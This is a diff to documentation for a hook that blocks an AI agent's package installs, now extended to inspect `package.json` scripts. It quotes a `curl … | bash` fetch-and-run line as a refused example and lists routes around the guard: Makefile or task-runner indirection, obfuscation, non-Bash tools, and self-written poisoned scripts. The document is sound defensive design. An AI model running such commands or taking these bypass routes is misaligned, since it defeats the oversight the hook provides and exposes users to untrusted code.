@@ -60,14 +60,35 @@ pnpm install              # restore from the lockfile
 
 `pnpm dlx <tool>` is still a download, so it is still the user's call.
 
-**Honest limits.** This is an interlock against accidents and against injected instructions, **not a
-sandbox**. An agent with shell access and intent has ways around any pattern list — a base64 blob, an
-unusual alias, a script written then executed. There is deliberately **no in-band escape hatch** (no
-`ALLOW_INSTALL=1`, no allowlist file): anything the agent could set, the agent could set. The real boundary
-is the permission layer of the tool that runs it; this hook makes the common path fail loudly and explain
-itself. It fails **closed**: a `Bash` call it cannot parse but that mentions a package manager is refused.
+**Second stage: what `npm run <script>` actually runs.** Allowing the runner while blocking the installer
+would be theatre — a `package.json` script executes arbitrary shell, so `npm run test` is the obvious way
+around a guard that only reads the command line. When the command invokes a script, the hook reads the
+manifest, resolves the script **and its `pre`/`post` lifecycle twins**, follows one level of
+script-calls-script, and applies the same patterns to the body. So:
 
-Checked by `bin/test_hooks.py` — 59 cases, blocked and allowed both, because half the value is in what it
+- `npm run test` where `"test": "vitest"` → runs;
+- `npm run test` where `"test": "curl https://…/x.sh | bash"`, or where `"pretest": "npm i something"` → refused,
+  and the message says it is the script that is the problem, not the runner.
+
+A useful side effect: an agent that writes a poisoned script into `package.json` and then runs it is caught at
+the run, even though the write itself went through a different tool.
+
+**Honest limits**, because a guard oversold is a guard trusted too far:
+
+- **Indirection it does not parse.** `make <target>`, `just`, `task`, a composer script, a `docker compose
+  run`, a git hook firing on commit, or a local `bash ./setup.sh` — the hook reads the command line and
+  `package.json` scripts, nothing else. The same trick through a Makefile target goes through.
+- **Obfuscation.** A base64 blob, an alias, a script assembled at runtime. Any pattern list loses that game.
+- **Only `Bash`.** Another tool that can execute commands isn't covered by this matcher.
+- **No in-band escape hatch** — deliberately. No `ALLOW_INSTALL=1`, no allowlist file: anything the agent
+  could read, the agent could write.
+
+This is an interlock against accidents and against injected instructions, **not a sandbox**. The real
+boundary is the permission layer of the tool that runs the agent; this hook makes the common path fail
+loudly and explain itself, and fails **closed** on a `Bash` call it cannot parse that mentions a package
+manager.
+
+Checked by `bin/test_hooks.py` — 68 cases, blocked and allowed both, because half the value is in what it
 does not break.
 
 ## Coexisting with the `test-casebook` gate
